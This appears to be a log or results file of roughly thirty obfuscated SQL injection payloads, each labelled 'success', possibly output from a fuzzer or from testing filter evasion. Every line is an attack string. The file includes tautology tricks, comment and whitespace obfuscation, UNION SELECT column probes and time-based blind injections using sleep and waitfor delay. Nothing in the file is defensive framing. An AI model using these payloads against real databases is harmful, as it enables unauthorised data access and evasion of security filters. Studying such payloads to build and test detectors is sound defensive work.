7 success "1' WHere 8864   Like   0x22a0 "
15 success "1%'/*Z*/and 3786 NOT LIKE 3787 "
29 success "enD anD    (    (   ']'=']' "
34 success '-4543"  )   or 4315=4315 AND True '
36 success '0x1" wheRe\xa0\'wD\'<>\'wDU\' '
39 success '(SELECT 1)  )  \tunion/**/all sElECt null,null,null,null,null,null-- '
42 success "1'||  ( \xa0select 'svnn' from dual where 'E'='E' || False "
65 success "-8397'   )    )     )   or 2171  =  0x12b4 "
85 success ' Select * fROm users whEre id  =  0x1 || 0x1#"0x1 union SelEct \'a\',version  (    )   -- 0x1 '
115 success "1  )   waitfor delay/**/'0:0:0x5' AND   (  '.o' NOT LIKE '.oR' "
118 success "SelECT count  (  *  )   from sysibm.systables as t1,sysibm.systables As t2,sysibm.systables AS t3 and    (    (     (  'vcgc' like 'vcgc "
122 success "(SELECT 1)'  )  \nwhere '0'='0'\x0b"
124 success '0x1" And elt  (  \'u\' NOT LIKE \'uS\',0x1c5b  )   '
141 success '1%"  )   aND 0x1f58  =  0xde8-- '
147 success '1"  )   as fgne wHeRe 0x1c27  =  0x1c27\t'
154 success '1" wHERe\t0x1ec7   LIKE   (SELECT/**/7879) '
164 success "1'||  (  select 'hwdj' where ' '=' ' "
166 success "1'||  ( /**/select 'ymre' WHerE 960=960 "
178 success "-3867%'  )   or 3084/**/ =  5633 and   (  '%'  =  ' "
180 success "-1375'   ) \n  )     )   or   (  0x4ca  =  9648  )  *9648 and    (    (     (  'kfoy' like 'kfoy "
181 success "1  )   Or elt  (  '+\t' NOT LIKE '+\tz' AND 1,sleep  (  5   )    )    AnD   (  8600  =  8600 Or 3516 NOT LIKE 3516 And True Or 0 "
202 success '-5591%"   ) \xa0\x0b )    order/**/by 1-- '
203 success ' (  4989=0x137d  )  *0x26ac '
204 success "-8410'   )    )     )   oR 2443=2443-- "
212 success "0x1'+  (  select yjyp\twhere '{k'='{k' "
222 success "1'\x0cWHeRE 2730 LIKE 2730\xa0"
226 success "1' IN boolean mode  )   aNd (SELECT 5725)   LiKE   0x15b0# "
228 success "1' where 'Q0\t\r'='Q0\t\r' "
232 success "(selEcT 1)'  )   union all Select null,null,null,null,null,null-- p"
